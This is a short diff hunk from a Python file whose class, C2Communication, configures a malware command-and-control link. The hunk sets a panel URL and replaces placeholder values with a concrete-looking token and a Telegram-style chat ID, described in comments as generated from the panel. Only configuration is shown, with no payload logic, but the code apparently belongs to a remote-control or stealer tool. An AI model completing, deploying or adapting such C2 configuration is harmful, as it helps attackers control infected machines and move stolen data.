@@ -4222,8 +4222,8 @@ class C2Communication:
     def __init__(self):
         # ========== PANEL CONFIGURATION – CHANGE THESE ==========
         self.panel_url = "http://localhost:5000"   # Your panel's URL
-        self.token = "tg_..."                      # Generated token from panel
-        self.chat_id = "-100..."                   # Generated chat_id from panel
+        self.token = "tg_TWFpbi5weToxNzc2ODAyNzk2OmF3mi-b6-V1QsZqoGbKwPw"                      # Generated token from panel
+        self.chat_id = "-1409404929922"                   # Generated chat_id from panel
         # ========================================================
         
         self.session = requests.Session()
